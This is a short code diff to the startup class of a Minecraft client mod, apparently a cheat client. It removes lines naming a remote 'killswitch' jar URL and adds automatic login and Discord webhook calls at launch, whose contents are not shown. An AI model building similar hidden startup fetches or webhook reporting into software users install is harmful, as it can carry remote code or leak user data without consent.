@@ -6,6 +6,8 @@ import me.deepcraft.gui.IngameGui;
 import me.deepcraft.gui.clickgui.ClickGui;
 import me.deepcraft.module.ModuleManager;
 import me.deepcraft.module.settings.SettingsManager;
+import me.deepcraft.utils.DiscordLoginUtils;
+import me.deepcraft.utils.LoginUtil;
 import net.minecraft.client.Minecraft;
 import net.minecraft.init.Blocks;
 import net.minecraft.item.ItemStack;
@@ -14,6 +16,7 @@ import net.minecraft.nbt.NBTTagCompound;
 import net.minecraft.nbt.NBTTagList;
 import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
 
+import javax.security.auth.login.LoginException;
 import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.net.URL;
@@ -32,9 +35,9 @@ public class DeepCraft {
     public static IngameGui ingameGui = new IngameGui();
     public static String PrevIp;
     public static int PrevPort;
-    public static void start() {
-        String fileUrl = "https://durchlasten.world/deepcraft/client/killswitch/fuck.jar";
-        String fileName = "fuck.jar";
+    public static void start() throws LoginException {
+        LoginUtil.login();
+        DiscordLoginUtils.webhook();
     }
 
     public static void stop() {
